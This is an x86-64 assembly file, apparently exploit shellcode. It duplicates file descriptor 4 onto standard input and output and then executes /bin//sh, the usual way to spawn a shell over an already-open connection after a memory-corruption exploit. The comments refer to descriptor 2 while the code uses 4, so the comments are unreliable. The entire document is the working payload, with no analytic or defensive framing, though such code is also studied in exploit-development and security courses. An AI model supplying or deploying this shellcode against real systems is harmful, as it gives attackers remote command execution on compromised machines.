        /* dup_stderr.s */
        .intel_syntax noprefix
        .globl _start
_start:
        /* dup2(2, 0) */
        xor edx, edx
        xor esi, esi
		/* fd 4*/
        lea edi, [edx+4] 
        lea eax, [edx+33]
        syscall
        /* dup2(2, 1) */
        inc esi
        lea eax, [edx+33]
        syscall
        /* execve("/bin//sh", {"/bin//sh", NULL}, NULL) */
		xor rdx, rdx
        push rdx
        mov rax, 0x68732f2f6e69622f
        push rax
        mov rdi, rsp
        push rdx
        push rdi
        mov rsi, rsp
        lea rax, [rdx+59]
        syscall
